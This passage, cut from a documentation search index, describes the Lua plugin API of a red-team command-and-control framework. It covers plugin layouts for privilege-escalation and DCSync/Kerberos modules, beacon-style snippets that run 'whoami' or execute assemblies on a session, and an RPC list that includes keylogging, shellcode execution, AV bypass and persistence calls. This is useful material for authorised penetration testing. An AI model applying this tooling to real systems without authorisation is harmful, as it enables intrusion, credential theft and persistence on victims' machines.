\u4e8c\u8fdb\u5236/\u914d\u7f6e\u6587\u4ef6 \u274c \u4f9d\u8d56\u5e93 \u5176\u4ed6Mal\u5e93 \u274c"},{"location":"IoM/manual/mal/quickstart/#\u63d2\u4ef6\u76ee\u5f55\u7ed3\u6784","title":"\u63d2\u4ef6\u76ee\u5f55\u7ed3\u6784","text":"<p>mal-community\u4ed3\u5e93\u4e2d\u7684\u63d2\u4ef6\u9075\u5faa\u7edf\u4e00\u7684\u76ee\u5f55\u7ed3\u6784\uff0c\u4ee5community-elevate\u548ccommunity-domain\u4e3a\u4f8b\uff1a</p> <pre><code>community-elevate/          # \u63d0\u6743\u5de5\u5177\u5305\n\u251c\u2500\u2500 mal.yaml               # \u63d2\u4ef6\u914d\u7f6e\u6587\u4ef6\n\u251c\u2500\u2500 main.lua              # \u5165\u53e3\u811a\u672c\n\u251c\u2500\u2500 resources/            # \u8d44\u6e90\u6587\u4ef6\u76ee\u5f55\n\u2502   \u251c\u2500\u2500 windows/         # Windows\u5e73\u53f0\u8d44\u6e90\n\u2502   \u2502   \u251c\u2500\u2500 x64/        # 64\u4f4d\u7a0b\u5e8f\n\u2502   \u2502   \u2514\u2500\u2500 x86/        # 32\u4f4d\u7a0b\u5e8f\n\u2502   \u2514\u2500\u2500 linux/          # Linux\u5e73\u53f0\u8d44\u6e90\n\u2514\u2500\u2500 lib/                 # \u4f9d\u8d56\u5e93\u6587\u4ef6\n    \u2514\u2500\u2500 utils.lua       # \u5de5\u5177\u51fd\u6570\n\ncommunity-domain/          # \u57df\u6e17\u900f\u5de5\u5177\u5305\n\u251c\u2500\u2500 mal.yaml              # \u63d2\u4ef6\u914d\u7f6e\u6587\u4ef6\n\u251c\u2500\u2500 main.lua             # \u5165\u53e3\u811a\u672c\n\u251c\u2500\u2500 modules/             # \u529f\u80fd\u6a21\u5757\n\u2502   \u251c\u2500\u2500 kerberos.lua    # Kerberos\u76f8\u5173\n\u2502   \u251c\u2500\u2500 ldap.lua        # LDAP\u67e5\u8be2\n\u2502   \u2514\u2500\u2500 dcsync.lua      # DCSync\u529f\u80fd\n\u251c\u2500\u2500 resources/           # \u8d44\u6e90\u6587\u4ef6\n\u2502   \u2514\u2500\u2500 tools/          # \u5de5\u5177\u4e8c\u8fdb\u5236\n\u2514\u2500\u2500 config/             # \u914d\u7f6e\u6587\u4ef6\n    \u2514\u2500\u2500 targets.yaml    # \u76ee\u6807\u914d\u7f6e\n</code></pre> <p>\u5178\u578b\u7684mal.yaml\u914d\u7f6e\u793a\u4f8b\uff1a</p> <pre><code>name: community-elevate\ntype: lua\nauthor: chainreactors\nversion: v1.0.0\nentry: main.lua\ndescription: Windows/Linux\u63d0\u6743\u5de5\u5177\u96c6\u5408\ndepend_module:\n  - lib\n  - common\nresources:\n  - resources/\ntags:\n  - elevate\n  - privilege\n  - windows\n  - linux\n</code></pre>"},{"location":"IoM/manual/mal/quickstart/#api\u5206\u5c42","title":"API\u5206\u5c42","text":"<p>Mal\u63d0\u4f9b\u4e09\u5c42API\u4f53\u7cfb\uff0c\u6ee1\u8db3\u4e0d\u540c\u590d\u6742\u5ea6\u7684\u9700\u6c42\uff1a</p> API\u5c42 \u7528\u9014 \u7279\u70b9 \u9002\u7528\u573a\u666f Builtin \u6838\u5fc3\u529f\u80fd \u7b80\u5355\u76f4\u89c2 \u5e38\u89c4\u64cd\u4f5c Beacon CS\u517c\u5bb9 AggressorScript\u98ce\u683c CS\u8fc1\u79fb RPC \u5b8c\u6574\u529f\u80fd \u539f\u59cbgRPC \u9ad8\u7ea7\u64cd\u4f5c"},{"location":"IoM/manual/mal/quickstart/#\u9ad8\u7ea7\u7528\u6cd5","title":"\u9ad8\u7ea7\u7528\u6cd5","text":""},{"location":"IoM/manual/mal/quickstart/#beacon-package","title":"beacon package","text":"<p>beacon package \u662f\u5426\u6309\u7167CobaltStrike\u7684aggressive script\u7684api\u7b7e\u540d\u5c01\u88c5\u7684\u4e00\u5957\u63a5\u53e3\uff0c \u7528\u6765\u63d0\u4f9b\u7c7b\u4f3caggressive script \u7f16\u5199\u7684\u4f53\u9a8c\u3002 </p> <pre><code>local beacon = require(\"beacon\")\n\nbeacon.bexecute(active(), \"whoami\")\n</code></pre> <p>\u76ee\u524d\u652f\u6301\u7684\u6240\u6709aggressive script \u98ce\u683c\u7684api\u6587\u6863\u8bf7\u89c1: https://chainreactors.github.io/wiki/IoM/manual/mal/beacon/</p>"},{"location":"IoM/manual/mal/quickstart/#new-protobuf-message","title":"new protobuf message","text":"<p>\u5728builtin\u548cbeacon \u5305\u4e2d, \u7edd\u5927\u591a\u6570api\u90fd\u662f\u9ad8\u5ea6\u5c01\u88c5\u7684, \u5e76\u4e0d\u9700\u8981\u8fc7\u591a\u5173\u6ce8\u5e95\u5c42\u7684GRPC\u63a5\u53e3\u8c03\u7528\u3002</p> <p>\u4f46\u5982\u679c\u8981\u8c03\u7528 rpc \u5305\u4e2d\u7684\u63a5\u53e3\uff0c\u5c31\u9700\u8981\u624b\u52a8\u521b\u5efa\u5bf9\u5e94\u7684protobuf message.</p> <p>mals\u5df2\u7ecf\u5c06\u6240\u6709\u7684protobuf message\u90fd\u6ce8\u518c\u5230\u4e86lua\u4e2d, \u5e76\u6dfb\u52a0\u4e86\u5fc5\u8981\u7684\u63a5\u53e3.</p> <pre><code>local bin = ExecuteBinary.New()\nbin.Name = \"execute_assembly\"\nbin.Args = {\"whoami\"}\nbin.Bin = read_resource(\"example.exe\")\n</code></pre> <p>\u6216</p> <pre><code>local bin = ExecuteBinary.New({\n    Name = \"execute_assembly\",\n    Bin = read_resource(\"example.exe\"),\n    Type = \"example_type\",\n    Args = {\"whoami\"}\n})\n</code></pre>"},{"location":"IoM/manual/mal/quickstart/#\u52a8\u6001new-protobuf-message","title":"\u52a8\u6001new protobuf message","text":"<p>mals\u6dfb\u52a0\u4e86ProtobufMessage \u4f5c\u4e3a\u901a\u7528\u7684\u53cd\u5c04\u83b7\u53d6package name\u7684 <pre><code>local msg = ProtobufMessage.New(\"modulepb.ExecuteBinary\", {\n    Name = \"execute_assembly\",\n    Bin = read_resource(\"example.exe\"),\n    Type = \"example_type\",\n    Args = {\"whoami\"}\n})\n</code></pre></p>"},{"location":"IoM/manual/mal/quickstart/#\u8c03\u7528rpc\u547d\u4ee4","title":"\u8c03\u7528rpc\u547d\u4ee4","text":"<pre><code>function load_rem()\n     local rpc = require(\"rpc\")\n\n     local task = rpc.LoadRem(active():Context(), ProtobufMessage.New(\"modulepb.Request\", {\n         Name = \"load_rem\",\n         Bin = read_resource(\"chainreactors/rem.dll\"),\n     }))\n     wait(task)\nend\n</code></pre>"},{"location":"IoM/manual/mal/quickstart/#\u6ce8\u518c\u4e3a\u5e93","title":"\u6ce8\u518c\u4e3a\u5e93","text":"<p>mals\u5141\u8bb8\u7528\u6237\u81ea\u884c\u5b9e\u73b0\u7684\u63d2\u4ef6\u4f5c\u4e3a\u7c7b\u5e93\uff0c\u6210\u4e3a\u5176\u4ed6\u5e93\u7684\u4f9d\u8d56\u3002 </p> <p>\u9996\u5148, \u9700\u8981\u5c06lib\u8bbe\u7f6e\u4e3ature <pre><code>name: community-lib\ntype: lua\nauthor: M09Ic\nversion: v0.0.1\nentry: main.lua\nlib: true\ndepend_module: \n</code></pre></p> <p>\u4f60\u7684lib\u9700\u53c2\u8003\u5982\u4e0b\u5199\u6cd5 <pre><code>-- community-lib/main.lua\n\nlocal lib = {}\n\nfunction lib.demo()\n    print(\"this is a lib demo\")\nend\n\nreturn lib\n</code></pre></p> <p>\u5f53\u4f60\u9700\u8981\u5728\u5176\u4ed6\u63d2\u4ef6\u4e2d\u4f7f\u7528\u8fd9\u4e2a\u5e93\u65f6, \u9700\u8981\u901a\u8fc7require\u7b49\u8c03\u7528 <pre><code>-- community-other/main.lua\n\nlocal clib = require(\"common-lib\")\nclib.demo()\n</code></pre></p>"},{"location":"IoM/manual/mal/rpc/","title":"rpc","text":""},{"location":"IoM/manual/mal/rpc/#basic","title":"basic","text":""},{"location":"IoM/manual/mal/rpc/#addcontext","title":"AddContext","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Context] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#addcredential","title":"AddCredential","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Context] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#adddownload","title":"AddDownload","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Context] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#addkeylogger","title":"AddKeylogger","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Context] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#addport","title":"AddPort","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Context] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#addscreenshot","title":"AddScreenShot","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Context] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#addupload","title":"AddUpload","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Context] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#broadcast","title":"Broadcast","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Event] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#bypass","title":"Bypass","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [BypassRequest] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#canceltask","title":"CancelTask","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [TaskCtrl] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#cat","title":"Cat","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Request] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#cd","title":"Cd","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Request] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#chmod","title":"Chmod","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Request] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#chown","title":"Chown","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [ChownRequest] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#clear","title":"Clear","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Request] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#cp","title":"Cp","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Request] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#curl","title":"Curl","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [CurlRequest] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#dll2shellcode","title":"DLL2Shellcode","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [DLL2Shellcode] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#deleteartifact","title":"DeleteArtifact","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Artifact] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#deletecertificate","title":"DeleteCertificate","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Cert] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#deleteprofile","title":"DeleteProfile","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Profile] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#download","title":"Download","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [DownloadRequest] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#downloadartifact","title":"DownloadArtifact","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Artifact] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#downloadcertificate","title":"DownloadCertificate","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Cert] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#exe2shellcode","title":"EXE2Shellcode","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [EXE2Shellcode] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#env","title":"Env","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Request] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#events","title":"Events","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Empty] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#execute","title":"Execute","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [ExecRequest] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#executeaddon","title":"ExecuteAddon","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [ExecuteAddon] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#executearmory","title":"ExecuteArmory","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [ExecuteBinary] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#executeassembly","title":"ExecuteAssembly","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [ExecuteBinary] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#executebof","title":"ExecuteBof","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [ExecuteBinary] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#executedll","title":"ExecuteDLL","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [ExecuteBinary] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#executeexe","title":"ExecuteEXE","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [ExecuteBinary] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#executelocal","title":"ExecuteLocal","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [ExecuteBinary] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#executepowerpick","title":"ExecutePowerpick","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [ExecuteBinary] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#executeshellcode","title":"ExecuteShellcode","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [ExecuteBinary] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#executespawn","title":"ExecuteSpawn","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [ExecuteBinary] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#getallcertificates","title":"GetAllCertificates","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Empty] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#getalltaskcontent","title":"GetAllTaskContent","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Task] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#getbasic","title":"GetBasic","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Empty] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#getclients","title":"GetClients","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Empty] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#getcontextfiles","title":"GetContextFiles","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Session] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#getcontexts","title":"GetContexts","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Context] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#getevent","title":"GetEvent","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Int] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#getfiles","title":"GetFiles","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Session] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#getgithubconfig","title":"GetGithubConfig","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Empty] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#getjobs","title":"GetJobs","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Empty] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#getlicenseinfo","title":"GetLicenseInfo","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Empty] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#getlisteners","title":"GetListeners","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Empty] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#getnotifyconfig","title":"GetNotifyConfig","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Empty] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#getprofiles","title":"GetProfiles","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Empty] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#getsession","title":"GetSession","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [SessionRequest] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#getsessionhistory","title":"GetSessionHistory","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Int] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#getsessions","title":"GetSessions","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [SessionRequest] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#getsystem","title":"GetSystem","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Request] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#gettaskcontent","title":"GetTaskContent","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Task] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#gettasks","title":"GetTasks","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [TaskRequest] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#info","title":"Info","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Request] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#inlinelocal","title":"InlineLocal","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [ExecuteBinary] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#kill","title":"Kill","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Request] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#listaddon","title":"ListAddon","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Request] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#listartifact","title":"ListArtifact","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Empty] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#listjobs","title":"ListJobs","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Empty] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#listmodule","title":"ListModule","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Request] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#listtasks","title":"ListTasks","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Request] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#loadaddon","title":"LoadAddon","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [LoadAddon] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#loadmodule","title":"LoadModule","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [LoadModule] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#loginclient","title":"LoginClient","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [LoginReq] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#ls","title":"Ls","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Request] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#mkdir","title":"Mkdir","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Request] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#mv","title":"Mv","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Request] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#netstat","title":"Netstat","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Request] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#notify","title":"Notify","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Event] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#onhook","title":"OnHook","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [On] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#ping","title":"Ping","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Ping] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#pipeclose","title":"PipeClose","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [PipeRequest] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#piperead","title":"PipeRead","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [PipeRequest] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#pipeupload","title":"PipeUpload","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [PipeRequest] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#polling","title":"Polling","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Polling] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#privs","title":"Privs","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Request] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#ps","title":"Ps","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Request] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#pwd","title":"Pwd","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Request] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#querytask","title":"QueryTask","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [TaskCtrl] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#refreshconfig","title":"RefreshConfig","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Empty] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#refreshmodule","title":"RefreshModule","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Request] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#regadd","title":"RegAdd","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [RegistryWriteRequest] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#regdelete","title":"RegDelete","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [RegistryRequest] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#reglistkey","title":"RegListKey","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [RegistryRequest] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#reglistvalue","title":"RegListValue","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [RegistryRequest] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#regquery","title":"RegQuery","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [RegistryRequest] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#remdial","title":"RemDial","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Request] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#rev2self","title":"Rev2Self","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Request] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#rm","title":"Rm","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Request] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#runas","title":"Runas","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [RunAsRequest] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#servicecreate","title":"ServiceCreate","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [ServiceRequest] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#servicedelete","title":"ServiceDelete","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [ServiceRequest] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#servicelist","title":"ServiceList","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Request] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#servicequery","title":"ServiceQuery","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [ServiceRequest] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#servicestart","title":"ServiceStart","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [ServiceRequest] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#servicestop","title":"ServiceStop","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [ServiceRequest] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#sessionevent","title":"SessionEvent","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Event] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#sessionmanage","title":"SessionManage","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [BasicUpdateSession] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#setenv","title":"SetEnv","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Request] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#shellcodeencode","title":"ShellcodeEncode","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [ShellcodeEncode] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#sleep","title":"Sleep","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Timer] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#suicide","title":"Suicide","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Request] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#switch","title":"Switch","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Switch] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#sync","title":"Sync","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Sync] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#taskschdcreate","title":"TaskSchdCreate","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [TaskScheduleRequest] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#taskschddelete","title":"TaskSchdDelete","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [TaskScheduleRequest] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#taskschdlist","title":"TaskSchdList","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Request] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#taskschdquery","title":"TaskSchdQuery","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [TaskScheduleRequest] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#taskschdrun","title":"TaskSchdRun","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [TaskScheduleRequest] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#taskschdstart","title":"TaskSchdStart","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [TaskScheduleRequest] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#taskschdstop","title":"TaskSchdStop","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [TaskScheduleRequest] </li> </ul>"},{"location":"IoM/manual/mal/rpc/#unsetenv","title":"UnsetEnv","text":"<p>Arguments</p> <ul> <li><code>$1</code> [context] </li> <li><code>$2</code> [Request] </li> 